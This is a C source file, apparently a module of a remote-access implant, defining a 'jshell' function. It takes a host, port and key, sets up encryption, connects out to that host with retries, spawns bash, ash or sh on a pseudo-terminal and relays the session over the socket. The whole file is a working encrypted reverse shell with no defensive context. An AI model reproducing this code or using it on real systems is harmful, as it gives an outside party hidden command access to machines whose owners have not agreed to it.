#include "jshell.h"

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <string.h>

#include "farm9crypt.h"
#include "polarssl/net.h"
#include "debug.h"
#include "shuffle.h"

#ifdef	LINUX
#include <pty.h>
#endif

// configured to call-out only
void *jshell(void *input)
{
	int netfd;
	int pid;
	int pty;
	int tries = 3;

	char *host = strtok(input, " ");
	char *port = strtok(NULL, " ");
	char *key = strtok(NULL, " ");

	DLX(3, printf("\tHost: %s, Port: %i, Key: %s\n", host, atoi(port), key));

	farm9crypt_init(key);

	while (tries > 0) {
		int ret;
		if ((ret = net_connect(&netfd, host, atoi(port))) != 0) {
			DLX(3, printf("\tnet_connect() failed with error: 0x%4x\n", ret));
			sleep(1);
			tries--;
		} else {
			DLX(3, printf("\tnet_connect() success\n"));
			break;
		}
	}
	if (tries == 0) {
		DLX(3, printf("\tExceeded connection attempts; exiting.\n"));
		return (void *) -1;
	}

	DLX(3, printf("\tnetfd = %i\n", netfd));

	pid = forkpty(&pty, NULL, NULL, NULL);

	if (pid < 0) {
		DLX(3, perror("\tfork(): "));
		DLX(3, printf("Returning from jshell()\n"));
		return (void *) -1;
	}

	if (pid == 0) {
		// this is the child
		close(netfd);

		// Find a shell that works. The first one that works doesn't return.
		(void) execl("/bin/bash", "bash", (char *) 0);
		(void) execl("/bin/ash", "ash", (char *) 0);
		(void) execl("/bin/sh", "sh", (char *) 0);

		// not reached (unless all of the above failed)
		return (void *) -1;
	} else {
		// this is the parent
		shuffle(pty, netfd);
		DLX(3, printf("Returning from jshell()\n"));
		return (void *) 0;
	}

	// not reached
	return (void *) 0;
}
